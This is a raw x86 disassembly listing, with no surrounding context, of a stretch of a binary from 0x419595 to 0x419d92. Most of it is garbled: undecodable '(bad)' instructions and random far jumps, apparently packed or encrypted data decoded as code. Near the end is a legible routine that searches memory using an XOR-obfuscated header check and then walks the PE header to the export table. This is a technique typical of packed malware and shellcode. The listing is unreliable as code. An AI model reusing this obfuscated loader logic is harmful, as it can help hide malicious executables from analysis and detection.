  419595:	loop   0x4195db
  419597:	cmc    
  419598:	cli    
  419599:	xor    bl,BYTE PTR [edi-0x32]
  41959c:	add    dh,ah
  41959e:	inc    DWORD PTR [eax+0x3e6a58d3]
  4195a4:	xchg   DWORD PTR [ecx+0x37ff6a6f],edx
  4195aa:	div    bl
  4195ac:	test   eax,0x726a146c
  4195b1:	dec    esi
  4195b2:	mov    ch,0x87
  4195b4:	fisub  DWORD PTR [ebp-0x450c160c]
  4195ba:	or     al,0x1d
  4195bc:	mov    ds:0xfe432c65,al
  4195c1:	fistp  WORD PTR [edx-0x29f4214d]
  4195c7:	sti    
  4195c8:	addr16 lahf 
  4195ca:	in     al,dx
  4195cb:	pop    eax
  4195cc:	mov    ds:0x246c3f50,al
  4195d1:	scas   al,BYTE PTR es:[edi]
  4195d2:	dec    esi
  4195d3:	xor    eax,0xf864d2
  4195d8:	pop    edi
  4195d9:	add    al,0x66
  4195db:	xor    al,0x1
  4195dd:	add    bh,BYTE PTR [ecx+0xa]
  4195e0:	inc    esp
  4195e1:	push   ecx
  4195e2:	or     DWORD PTR [eax],esp
  4195e4:	lahf   
  4195e5:	lods   eax,DWORD PTR ds:[esi]
  4195e6:	inc    esi
  4195e7:	fmul   QWORD PTR [ebp-0x7e]
  4195ea:	xor    ch,BYTE PTR ds:0x6d1a5663
  4195f0:	xor    ebp,esp
  4195f2:	add    eax,0x43ea2962
  4195f7:	aaa    
  4195f8:	dec    ebx
  4195f9:	fs jb  0x4195d2
  4195fc:	cmp    ecx,DWORD PTR [edx+ebp*8+0x1d]
  419600:	int3   
  419601:	mov    ebp,0xf8a2c561
  419606:	mov    esi,DWORD PTR [edx+0x5f2bda70]
  41960c:	xchg   DWORD PTR [esi+0x3d],edx
  41960f:	(bad)  
  419610:	jmp    0x419677
  419612:	push   esp
  419613:	cmc    
  419614:	retf   
  419615:	dec    ecx
  419616:	pop    ebp
  419617:	scas   al,BYTE PTR es:[edi]
  419618:	and    DWORD PTR [ecx-0x3cff7d72],esp
  41961e:	mov    bh,0xc2
  419620:	pop    edx
  419621:	dec    ebp
  419622:	and    eax,0xaf745781
  419627:	(bad)  
  419628:	fmul   DWORD PTR [edx+0x27]
  41962b:	cdq    
  41962c:	mov    edx,0xf308684
  419631:	std    
  419632:	popf   
  419633:	ficomp WORD PTR [edi-0x16403211]
  419639:	cmp    al,0x75
  41963b:	cmp    DWORD PTR [ecx],edx
  41963d:	lahf   
  41963e:	into   
  41963f:	push   ss
  419640:	mov    ah,0xdb
  419642:	cld    
  419643:	fwait
  419644:	jmp    0xc714:0x227ed105
  41964b:	je     0x4196c5
  41964d:	push   edi
  41964e:	push   ebx
  419650:	push   edi
  419651:	sub    DWORD PTR [esi],esi
  419653:	inc    ebx
  419654:	fcmove st,st(5)
  419656:	lock adc eax,0x8d63b01a
  41965c:	xchg   BYTE PTR [ebp-0x48],ch
  41965f:	icebp  
  419660:	not    BYTE PTR [esp+edx*2-0x18]
  419664:	fsubr  st(3),st
  419666:	and    eax,0x70fb600
  41966b:	pop    ebp
  41966c:	adc    dh,dh
  41966e:	test   DWORD PTR [eax+0x730cd573],0x607b656e
  419678:	dec    ecx
  419679:	ins    DWORD PTR es:[edi],dx
  41967a:	into   
  41967b:	ins    BYTE PTR es:[edi],dx
  41967c:	jle    0x419680
  41967e:	fiadd  DWORD PTR fs:[ebp-0x28]
  419682:	in     al,dx
  419683:	mov    edi,0xe7251e60
  419688:	cmp    DWORD PTR [edx+ebx*1-0x6b],edx
  41968c:	stos   DWORD PTR es:[edi],eax
  41968d:	les    ebx,FWORD PTR [edi+0xe]
  419690:	rol    BYTE PTR [edi+0x15],1
  419693:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419695:	rol    DWORD PTR [eax],cl
  419697:	xchg   dh,ah
  419699:	xor    eax,0x453e3acf
  41969e:	adc    esp,DWORD PTR [ecx+eiz*4+0x63]
  4196a2:	or     edi,DWORD PTR [ebx-0x13fc94e9]
  4196a8:	arpl   WORD PTR [edi],bp
  4196aa:	shl    DWORD PTR [edi+esi*8],0x13
  4196ae:	pop    ecx
  4196af:	push   0xb693352e
  4196b4:	shl    esp,1
  4196b6:	or     cl,cl
  4196b8:	cmp    DWORD PTR [edx-0x2f],ecx
  4196bb:	push   0x8d54b9bc
  4196c0:	jne    0xf3a5851
  4196c6:	aam    0x5d
  4196c8:	addr16 jnp 0x419667
  4196cb:	mov    dl,BYTE PTR [eax+edx*8+0xeb23a0a]
  4196d2:	ret    
  4196d3:	gs retf 
  4196d5:	mov    edi,0x7a749d34
  4196da:	scas   eax,DWORD PTR es:[edi]
  4196db:	mov    es,WORD PTR [edx-0x32b8d0df]
  4196e1:	xchg   esi,eax
  4196e2:	loopne 0x419746
  4196e4:	mov    ds:0x61ca1a37,eax
  4196e9:	xchg   ecx,ebp
  4196eb:	mov    ah,0x4d
  4196ed:	fistp  WORD PTR [eax]
  4196ef:	or     eax,esp
  4196f1:	outs   dx,BYTE PTR ds:[esi]
  4196f2:	xor    eax,0x71887ace
  4196f7:	mov    ds,WORD PTR [ebp+0x38ef39c0]
  4196fd:	sub    DWORD PTR [edx],esi
  4196ff:	mov    DWORD PTR [esp+edx*4+0x797c88c7],ecx
  419706:	push   ss
  419707:	fldcw  WORD PTR [eax]
  419709:	xchg   esp,eax
  41970a:	(bad)  
  41970b:	mov    eax,ds:0xf2d2e7fd
  419710:	fwait
  419711:	rep lods al,BYTE PTR ds:[esi]
  419713:	(bad)  
  419714:	push   ecx
  419715:	xor    BYTE PTR [esi-0x34f4d2c1],bl
  41971b:	mov    edx,0xa96b526b
  419720:	mov    ds:0x506e214b,al
  419725:	inc    ecx
  419726:	ss aas 
  419728:	imul   eax,DWORD PTR [edi+0x2337ab2d],0x4bfb3eb0
  419732:	sbb    al,0x1f
  419734:	cmp    BYTE PTR [ebx-0x60c37726],bh
  41973a:	stos   DWORD PTR es:[edi],eax
  41973b:	xor    al,BYTE PTR [edi+0x3a]
  41973e:	xchg   esi,eax
  41973f:	xor    edx,ebp
  419741:	stos   DWORD PTR es:[edi],eax
  419742:	xor    eax,0xdbd200da
  419747:	out    dx,al
  419748:	adc    eax,0xb546f4b8
  41974d:	and    bh,cl
  41974f:	(bad)  
  419750:	mov    eax,0xb6911abf
  419755:	mov    cl,0xd3
  419757:	dec    eax
  419758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41975a:	push   edi
  41975b:	mov    bh,0x5
  41975d:	scas   eax,DWORD PTR es:[edi]
  41975e:	mov    WORD PTR [edx],?
  419760:	push   esp
  419761:	sub    al,0xf8
  419763:	repz dec edi
  419765:	adc    ah,BYTE PTR [edx+0x5d]
  419768:	ja     0x4197e8
  41976a:	push   eax
  41976b:	mov    cl,0xe1
  41976d:	sub    al,0xba
  41976f:	jb     0x4197ac
  419771:	cwde   
  419772:	adc    esp,DWORD PTR [ebx+ebp*1]
  419775:	scas   eax,DWORD PTR es:[edi]
  419776:	jnp    0x4197d0
  419778:	mov    ecx,0x4e984a9b
  41977d:	and    dh,BYTE PTR [eax+eax*1+0x63e62321]
  419784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419785:	mov    dh,0x14
  419787:	in     eax,0x93
  419789:	aad    0x35
  41978b:	or     esi,DWORD PTR [edi-0x5]
  41978e:	ja     0x41973a
  419790:	cs jbe 0x4197c4
  419793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419794:	pop    edx
  419795:	jmp    DWORD PTR [ecx+0x1c]
  419798:	sub    BYTE PTR [ecx+0x361d3b10],0x42
  41979f:	ins    BYTE PTR es:[edi],dx
  4197a0:	js     0x4197ad
  4197a2:	add    eax,0x61e91f1
  4197a7:	hlt    
  4197a8:	push   esp
  4197a9:	bound  edi,QWORD PTR [edi-0x37]
  4197ac:	push   ecx
  4197ad:	push   ds
  4197ae:	xchg   edi,eax
  4197af:	aaa    
  4197b0:	shl    BYTE PTR ds:0x8efa475a,1
  4197b6:	loopne 0x419823
  4197b8:	(bad)  
  4197b9:	sbb    DWORD PTR [ebx-0x16],0x4924f46f
  4197c0:	lods   al,BYTE PTR ds:[esi]
  4197c1:	cmp    BYTE PTR [ebx-0x4d],bl
  4197c4:	fstp   TBYTE PTR [ecx+ebp*4]
  4197c7:	adc    esp,DWORD PTR [esi+0x53]
  4197ca:	test   DWORD PTR [esi-0x59],esi
  4197cd:	push   ss
  4197ce:	test   DWORD PTR [eax],edx
  4197d0:	retf   
  4197d1:	sbb    edi,esi
  4197d3:	pop    edx
  4197d4:	in     al,dx
  4197d5:	pop    esi
  4197d6:	mov    ebp,DWORD PTR [ecx]
  4197d8:	sub    ch,BYTE PTR [ecx+0x7f9d8f4]
  4197de:	icebp  
  4197df:	and    edx,DWORD PTR [ebx+0x9]
  4197e2:	pop    ecx
  4197e3:	mov    eax,ds:0xc6b9639d
  4197e8:	adc    ah,BYTE PTR [ebx-0x6a21d9b7]
  4197ee:	push   0xb1d2ee9f
  4197f3:	call   0x48b8793e
  4197f8:	mov    esi,0xafebeba2
  4197fd:	mov    eax,0xef28ccf1
  419802:	rcr    DWORD PTR [ebx-0x9],0x7c
  419806:	jmp    0x100e104b
  41980b:	clc    
  41980c:	xchg   ebp,eax
  41980d:	mov    ebx,0x6429f940
  419813:	lea    ecx,[edi-0x6892fa7a]
  419819:	lock and bl,BYTE PTR [edi-0x8]
  41981d:	sbb    eax,0xdf6d3ff3
  419822:	arpl   bp,di
  419824:	push   esp
  419825:	in     al,dx
  419826:	daa    
  419827:	sbb    BYTE PTR [ecx-0x43],al
  41982a:	xor    eax,0xc58e08dc
  41982f:	(bad)  
  419830:	push   edi
  419831:	pop    esi
  419832:	add    esi,DWORD PTR [ecx-0x7e]
  419835:	pop    edx
  419836:	xchg   edx,eax
  419837:	jo     0x4197e6
  419839:	out    dx,eax
  41983a:	test   al,0x29
  41983c:	mov    edi,0x9a85d1c8
  419841:	retf   
  419842:	(bad)  
  419843:	adc    edi,DWORD PTR [edx+0x5e]
  419846:	push   ecx
  419847:	fnstenv [ebx]
  419849:	ror    BYTE PTR [ebx-0x74d9ca6c],0x18
  419850:	scas   al,BYTE PTR es:[edi]
  419851:	ret    
  419852:	xor    dl,0x4e
  419855:	cmp    BYTE PTR [ebp+0x1e2daf7e],ah
  41985b:	dec    edi
  41985c:	push   ebp
  41985d:	rcr    BYTE PTR [esi+esi*4],1
  419860:	les    ecx,FWORD PTR [ecx-0xb]
  419863:	test   eax,0x54447753
  419868:	mov    ecx,0x83fbe001
  41986d:	dec    esi
  41986e:	push   esp
  41986f:	shl    BYTE PTR [edx+0x43fb9750],cl
  419875:	mov    edi,0x2108bc40
  41987a:	cmp    bl,BYTE PTR [esi]
  41987c:	jns    0x419833
  41987e:	and    bh,BYTE PTR [edx]
  419880:	loope  0x419853
  419882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419883:	jmp    0x419863
  419885:	xor    ebx,DWORD PTR [esi-0x6f064561]
  41988b:	mov    ebp,0xbc6f5a16
  419890:	inc    esp
  419891:	push   0xde95e65f
  419896:	cmp    DWORD PTR [edi+0x5e],0xffffffb5
  41989a:	or     esp,ecx
  41989c:	inc    esi
  41989d:	in     al,0x15
  41989f:	adc    eax,DWORD PTR [edx+ebx*2]
  4198a2:	sub    ch,BYTE PTR [esi-0x4e]
  4198a5:	es into 
  4198a7:	data16 mov al,ds:0xa4f6d44a
  4198ad:	mov    BYTE PTR [eax],bl
  4198af:	pop    esp
  4198b0:	into   
  4198b1:	out    0x8d,al
  4198b3:	retf   
  4198b4:	jmp    0x41987b
  4198b6:	aad    0x77
  4198b8:	mov    ch,0xc9
  4198ba:	xor    eax,0x7e6d1505
  4198bf:	in     eax,0x36
  4198c1:	jns    0x4198b3
  4198c3:	test   BYTE PTR ds:0xbdd1d119,al
  4198c9:	adc    bl,BYTE PTR [ecx+0x6b]
  4198cc:	lds    esi,FWORD PTR [eax+ebx*2]
  4198cf:	adc    bl,BYTE PTR [eax+0x24]
  4198d2:	sar    BYTE PTR [edx-0x1e],1
  4198d5:	push   ds
  4198d6:	xchg   esi,eax
  4198d7:	lods   al,BYTE PTR ds:[esi]
  4198d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198d9:	mov    ds:0xe366b957,eax
  4198de:	dec    esp
  4198df:	xor    al,0xb2
  4198e1:	add    edi,eax
  4198e3:	cwde   
  4198e4:	jns    0x4198c4
  4198e6:	clc    
  4198e7:	in     al,0xf4
  4198e9:	arpl   dx,ax
  4198eb:	test   BYTE PTR [edi+edi*2+0x1b],bh
  4198ef:	test   BYTE PTR [ecx],ah
  4198f1:	mov    cl,0xbe
  4198f3:	and    eax,0x60da0e38
  4198f8:	mov    ds:0xac82985f,al
  4198fd:	stos   BYTE PTR es:[edi],al
  4198fe:	cld    
  4198ff:	inc    esi
  419900:	out    0xd7,al
  419902:	push   ebx
  419903:	stc    
  419904:	sbb    eax,0x540745f1
  419909:	sub    DWORD PTR [edx+0x3b9c656a],esp
  41990f:	push   0x6b22f09
  419914:	lods   al,BYTE PTR ds:[esi]
  419915:	retf   0x3416
  419918:	(bad)  
  419919:	leave  
  41991a:	pop    edx
  41991b:	lea    edi,[edi+0x14f0be6c]
  419921:	out    0x25,al
  419923:	call   0x5df4:0xda4bb3a
  41992a:	or     eax,DWORD PTR [edi+0xd72af6a]
  419930:	ret    
  419931:	ret    
  419932:	push   ds
  419933:	outs   dx,BYTE PTR ds:[esi]
  419934:	rol    DWORD PTR [ebp-0x683df84a],0x56
  41993b:	repnz data16 in al,dx
  41993e:	inc    esi
  41993f:	adc    DWORD PTR [ebx+0x1],esi
  419942:	xor    ch,BYTE PTR [ecx+0xf]
  419945:	inc    DWORD PTR [ebp+0x3c]
  419948:	mov    ds:0x89038b54,eax
  41994d:	sahf   
  41994e:	xor    bl,BYTE PTR [ebp+0x4f]
  419951:	xor    al,0xac
  419953:	xchg   esi,eax
  419954:	lea    esp,[edx+0x20]
  419957:	shl    DWORD PTR [edi],cl
  419959:	xchg   DWORD PTR [ecx+0x2a],edi
  41995c:	cmc    
  41995d:	adc    al,0x5e
  41995f:	imul   esi,DWORD PTR [esi],0x5a03ad11
  419965:	fwait
  419966:	mov    cl,0xc3
  419968:	xchg   edx,eax
  419969:	push   es
  41996a:	daa    
  41996b:	cmp    BYTE PTR [eax-0x6e],ch
  41996e:	and    esi,DWORD PTR [ebp+0x27]
  419971:	cmp    edx,DWORD PTR [esi]
  419973:	add    ebp,DWORD PTR [edx]
  419975:	inc    edi
  419976:	jb     0x41990d
  419978:	aaa    
  419979:	(bad)  
  41997a:	call   0xf6ff:0xe7f096a6
  419981:	aaa    
  419982:	js     0x419908
  419984:	xchg   edi,eax
  419985:	cmp    ebx,DWORD PTR [edx+0x62]
  419988:	lea    edx,[eax]
  41998a:	leave  
  41998b:	mov    ch,0x99
  41998d:	mov    al,ds:0x9850adf5
  419992:	cmp    ch,BYTE PTR [ebx+0x47]
  419995:	mov    BYTE PTR [ebx-0x3f],0xdc
  419999:	daa    
  41999a:	sbb    DWORD PTR [eax-0x721c588f],ecx
  4199a0:	or     cl,BYTE PTR [ebx]
  4199a2:	enter  0x2f52,0xf8
  4199a6:	dec    esp
  4199a7:	or     DWORD PTR [esi-0x62ea4bb1],edi
  4199ad:	loope  0x41992f
  4199af:	dec    ebp
  4199b0:	lods   eax,DWORD PTR ds:[esi]
  4199b1:	sbb    DWORD PTR [ecx],0xe6e953a7
  4199b7:	push   ebx
  4199b8:	xor    cl,al
  4199ba:	out    0x8f,eax
  4199bc:	dec    eax
  4199bd:	cmp    eax,0x1000d9bb
  4199c2:	dec    esi
  4199c3:	sub    bh,ah
  4199c5:	jnp    0x419a1d
  4199c7:	sbb    al,0x17
  4199c9:	enter  0xe720,0x91
  4199cd:	push   edx
  4199ce:	mov    ecx,0x3b2de420
  4199d3:	or     DWORD PTR [edx-0x78e6c118],eax
  4199d9:	pusha  
  4199da:	adc    DWORD PTR [ebp+0x3edecf5c],ebx
  4199e0:	xor    DWORD PTR [ebp-0xa],0x9db82268
  4199e7:	(bad)  
  4199e8:	aam    0x47
  4199ea:	or     DWORD PTR [ebx+0x59361e0d],ecx
  4199f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f1:	jmp    0xd812:0xe6b44c0d
  4199f8:	sbb    bl,bl
  4199fa:	(bad)  
  4199fb:	sahf   
  4199fc:	or     eax,0xea49a60b
  419a01:	aam    0x71
  419a03:	add    eax,0x7bed9d97
  419a08:	push   0xb1a128ba
  419a0d:	pop    es
  419a0e:	mov    al,ds:0x9a8d2612
  419a13:	cmc    
  419a14:	pop    edi
  419a15:	or     bh,bh
  419a17:	mov    eax,ds:0x3da0ff44
  419a1c:	xchg   eax,eax
  419a1e:	push   edi
  419a1f:	sbb    eax,esp
  419a21:	imul   DWORD PTR [eax-0x6e]
  419a24:	in     eax,dx
  419a25:	arpl   di,dx
  419a27:	cmp    al,0xd1
  419a29:	fdiv   QWORD PTR [ecx+0x50627668]
  419a2f:	in     al,dx
  419a30:	cmc    
  419a31:	int    0x25
  419a33:	mov    bh,0xd5
  419a35:	push   0xa1b4dc40
  419a3a:	mov    esp,0x2e2cee92
  419a3f:	add    BYTE PTR [ebx+eiz*2-0xd],ah
  419a43:	ret    0x12bc
  419a46:	inc    esp
  419a47:	in     eax,dx
  419a48:	cld    
  419a49:	adc    al,0x25
  419a4b:	mov    edi,0x527e8f78
  419a50:	cmp    al,0xbd
  419a52:	imul   esp,DWORD PTR [ebx+edx*1],0x1858d555
  419a59:	sahf   
  419a5a:	mov    eax,ds:0x1f20738f
  419a5f:	adc    esi,DWORD PTR [ebx]
  419a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a62:	iret   
  419a63:	push   esp
  419a64:	adc    edx,DWORD PTR [esi+edi*4-0x609642f3]
  419a6b:	pop    ecx
  419a6c:	outs   dx,BYTE PTR ds:[esi]
  419a6d:	adc    al,0x10
  419a6f:	add    al,BYTE PTR [edi]
  419a71:	into   
  419a72:	inc    eax
  419a73:	inc    ebx
  419a74:	(bad)  
  419a75:	imul   BYTE PTR [edx+0x4c]
  419a78:	pop    ss
  419a79:	and    ch,BYTE PTR [ebp+ecx*4-0x797058e5]
  419a80:	fild   WORD PTR [edx]
  419a82:	(bad)  
  419a83:	push   ebx
  419a84:	mov    edx,0x67054038
  419a89:	js     0x419a34
  419a8b:	xchg   ebp,eax
  419a8c:	rcr    BYTE PTR [ebx-0xe],cl
  419a8f:	xchg   edx,eax
  419a90:	mov    ecx,0xfc603272
  419a95:	or     DWORD PTR [eax],edi
  419a97:	fcmovb st,st(4)
  419a99:	and    eax,0xe831d581
  419a9e:	test   al,0xba
  419aa0:	sub    al,0x52
  419aa2:	bound  edx,QWORD PTR [esi]
  419aa4:	stos   DWORD PTR es:[edi],eax
  419aa5:	sbb    eax,0x454dcb59
  419aaa:	cmc    
  419aab:	(bad)  
  419aac:	loope  0x419abc
  419aae:	(bad)  
  419aaf:	xchg   edi,eax
  419ab0:	aas    
  419ab1:	xchg   ah,ah
  419ab3:	add    ah,BYTE PTR [edx-0x72]
  419ab6:	loope  0x419af5
  419ab8:	ret    0x4489
  419abb:	adc    al,0x6c
  419abd:	pop    ebx
  419abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419abf:	ins    DWORD PTR es:[edi],dx
  419ac0:	nop
  419ac1:	int    0x4b
  419ac3:	or     edi,0x5c
  419ac6:	out    dx,eax
  419ac7:	inc    ebx
  419ac8:	(bad)  
  419ac9:	into   
  419aca:	jecxz  0x419a60
  419acc:	pop    edi
  419acd:	stc    
  419ace:	sbb    cl,BYTE PTR [ebp+0x1f42ef09]
  419ad4:	loop   0x419a98
  419ad6:	mov    ecx,0x77cd9530
  419adb:	mov    ch,0x9d
  419add:	bound  ebx,QWORD PTR [esp+edx*2-0x49]
  419ae1:	or     eax,0x817dc87e
  419ae6:	lock shr bh,1
  419ae9:	jmp    ecx
  419aeb:	pop    edx
  419aec:	loope  0x419b4a
  419aee:	mov    bl,0xde
  419af0:	cmp    dl,BYTE PTR ds:0xadd0f33c
  419af6:	sti    
  419af7:	mov    bl,0x53
  419af9:	addr16 rcr cx,0x8e
  419afe:	idiv   cl
  419b00:	into   
  419b01:	mov    ah,0xe
  419b03:	dec    ecx
  419b04:	sub    al,0x6c
  419b06:	pushf  
  419b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b08:	mov    edi,0x1f2f5d0e
  419b0d:	and    ah,cl
  419b0f:	xchg   ebp,eax
  419b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b11:	dec    ebx
  419b12:	pop    esp
  419b13:	test   al,0x5c
  419b15:	xor    eax,DWORD PTR [edi+edx*2+0x58299c0f]
  419b1c:	cmp    bh,ch
  419b1e:	and    BYTE PTR [eax+edx*1-0x1d7484c5],ah
  419b25:	pop    edx
  419b26:	xor    DWORD PTR [edi],eax
  419b28:	pop    ebx
  419b29:	sub    dh,dl
  419b2b:	xchg   edx,eax
  419b2c:	mov    esp,0xdde70761
  419b31:	or     eax,0x3847fc60
  419b36:	adc    esi,DWORD PTR [ecx]
  419b38:	pop    ds
  419b39:	pop    esp
  419b3a:	call   0xee99:0x355acc37
  419b41:	adc    al,BYTE PTR [eax-0x67142d7a]
  419b47:	xor    ebp,DWORD PTR [eax+0x2c11dd36]
  419b4d:	lods   al,BYTE PTR ds:[esi]
  419b4e:	mov    dh,0x5a
  419b50:	in     eax,0x94
  419b52:	mov    ebx,DWORD PTR [esi-0x21bd8d75]
  419b58:	je     0x419b0a
  419b5a:	loop   0x419b65
  419b5c:	cmp    al,0xc
  419b5e:	in     eax,dx
  419b5f:	stos   DWORD PTR es:[edi],eax
  419b60:	mov    ebx,ecx
  419b62:	inc    esp
  419b63:	jbe    0x419b0c
  419b65:	mov    ebx,0x5b9bd6a1
  419b6a:	(bad)  
  419b6c:	(bad)  
  419b6d:	rcl    BYTE PTR [edx-0x32a8df4c],cl
  419b73:	arpl   WORD PTR [ecx],cx
  419b75:	push   edi
  419b76:	dec    ecx
  419b77:	dec    esi
  419b78:	popf   
  419b79:	inc    edx
  419b7a:	iret   
  419b7b:	ins    BYTE PTR es:[edi],dx
  419b7c:	rcl    DWORD PTR [esi+0x6d82718],1
  419b82:	stos   BYTE PTR es:[edi],al
  419b83:	aam    0x3f
  419b85:	aaa    
  419b86:	and    BYTE PTR [ebx],bl
  419b88:	push   esi
  419b89:	push   0xd133bd61
  419b8e:	xchg   edi,eax
  419b8f:	test   al,0xa5
  419b91:	stc    
  419b92:	cmp    eax,0x5365804c
  419b97:	cmp    DWORD PTR [esp+edx*2-0x4e],ebp
  419b9b:	sub    BYTE PTR [esp+eax*1+0x25],0xbd
  419ba0:	fsubr  st(0),st
  419ba2:	push   ecx
  419ba3:	mov    gs,WORD PTR [esi-0x70fb75ff]
  419ba9:	push   esi
  419baa:	jp     0x419c17
  419bac:	fistp  WORD PTR [eax+0x2c]
  419baf:	or     eax,DWORD PTR [edi]
  419bb1:	inc    ebx
  419bb2:	jmp    0x31f2:0xfd3bc0f
  419bb9:	scas   al,BYTE PTR es:[edi]
  419bba:	imul   edi,DWORD PTR [edi],0xffffffe7
  419bbd:	push   edi
  419bbe:	imul   eax,edx,0xb3298026
  419bc4:	mov    ds,WORD PTR [ecx-0x7ed6d3ba]
  419bca:	je     0x419ba8
  419bcc:	stc    
  419bcd:	xchg   DWORD PTR [esi+0xa3dcad9],esi
  419bd3:	out    dx,eax
  419bd4:	sbb    BYTE PTR [ebx],0xd4
  419bd7:	adc    dh,dh
  419bd9:	out    dx,al
  419bda:	mov    eax,ds:0xba783b6a
  419bdf:	push   ebp
  419be0:	mov    bh,0xfa
  419be2:	not    DWORD PTR [edx+0x30f6bbed]
  419be8:	jo     0x419bb9
  419bea:	pusha  
  419beb:	ja     0x419c5c
  419bed:	cld    
  419bee:	cli    
  419bef:	adc    BYTE PTR [ebx+ebp*4-0x729e20fc],0x70
  419bf7:	xchg   DWORD PTR [ebx+0x754baba9],eax
  419bfd:	retf   0xaffa
  419c00:	or     eax,0x126fc479
  419c05:	jle    0x419c40
  419c07:	jle    0x419c66
  419c09:	sbb    al,0xdc
  419c0b:	ins    DWORD PTR es:[edi],dx
  419c0c:	daa    
  419c0d:	pop    ss
  419c0e:	lahf   
  419c0f:	sahf   
  419c10:	fsub   QWORD PTR [eax]
  419c12:	and    BYTE PTR [edi+0x63c7272b],0xb9
  419c19:	aas    
  419c1a:	or     BYTE PTR [edi-0x39f1bf13],dh
  419c20:	nop
  419c21:	dec    ebx
  419c22:	aaa    
  419c23:	ds scas eax,DWORD PTR es:[edi]
  419c25:	sti    
  419c26:	test   al,0xdb
  419c28:	lds    ebp,FWORD PTR [esi]
  419c2a:	call   0x89777cc4
  419c2f:	jmp    0xc570:0x1ea324ee
  419c36:	add    eax,0x49f06bf7
  419c3b:	hlt    
  419c3c:	xor    DWORD PTR [edi+0x29167200],ebp
  419c42:	dec    esp
  419c43:	sub    DWORD PTR [ecx+ecx*4+0x18],edx
  419c47:	out    dx,al
  419c48:	add    al,0xa2
  419c4a:	add    eax,0x48cee1c9
  419c4f:	shl    bl,1
  419c51:	jno    0x419c18
  419c53:	adc    BYTE PTR [ebp+0x45],0x90
  419c57:	adc    BYTE PTR [edx+0x41],dl
  419c5a:	pop    eax
  419c5b:	mov    dh,0x44
  419c5d:	movntps XMMWORD PTR [ecx+0x43],xmm7
  419c61:	imul   eax
  419c63:	jns    0x419c07
  419c65:	mov    BYTE PTR [ecx+eax*2-0x78be05d1],al
  419c6c:	or     eax,0xffffffef
  419c6f:	retf   
  419c70:	sbb    ebp,DWORD PTR [edi-0x56]
  419c73:	sbb    dl,BYTE PTR [eax]
  419c75:	fs cmp ax,0x87e9
  419c7a:	inc    esi
  419c7b:	mov    esp,0xd73d30f2
  419c80:	push   ss
  419c81:	int3   
  419c82:	push   ebp
  419c83:	call   0x2896ef0f
  419c88:	sbb    al,0xab
  419c8a:	scas   al,BYTE PTR es:[edi]
  419c8b:	fnstenv [eax-0x657f4243]
  419c91:	aam    0x18
  419c93:	lods   eax,DWORD PTR ds:[esi]
  419c94:	inc    ecx
  419c95:	das    
  419c96:	addr16 mov cl,0x33
  419c99:	sub    DWORD PTR [edx],ebx
  419c9b:	(bad)  
  419c9c:	aad    0x8d
  419c9e:	add    bl,cl
  419ca0:	ins    DWORD PTR es:[edi],dx
  419ca1:	or     eax,0x27426db8
  419ca6:	ds js  0x419c9e
  419ca9:	inc    ebp
  419caa:	(bad)  
  419cab:	outs   dx,BYTE PTR ds:[esi]
  419cac:	push   ecx
  419cad:	enter  0xf5d6,0xc6
  419cb1:	and    dl,BYTE PTR [ebx-0x3585f99e]
  419cb7:	inc    esp
  419cb8:	jbe    0x419ca4
  419cba:	mov    ecx,0xf7d9ed29
  419cbf:	test   eax,0x5d5001b5
  419cc4:	mov    eax,ds:0x2aef8e1e
  419cc9:	cmp    al,0x5
  419ccb:	pop    ss
  419ccc:	jae    0x419c9a
  419cce:	mov    edx,0x9bad73f
  419cd3:	hlt    
  419cd4:	xchg   esp,eax
  419cd5:	loope  0x419d07
  419cd7:	mov    ecx,0xa585dd9a
  419cdc:	imul   bh
  419cde:	sbb    DWORD PTR [ebx-0x6c],ecx
  419ce1:	shl    BYTE PTR [ebx],1
  419ce3:	add    edi,DWORD PTR es:[edi]
  419ce6:	add    ecx,edi
  419ce8:	(bad)  [edx-0x4b]
  419ceb:	pop    edi
  419cec:	mov    ebx,DWORD PTR [ebp-0x28]
  419cef:	mov    edi,DWORD PTR [ebp-0x24]
  419cf2:	and    eax,esi
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	es or  esi,0xffffffdc
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x63bd192c
  419d90:	mov    bl,0xe6
  419d92:	mov    bl,0xdf
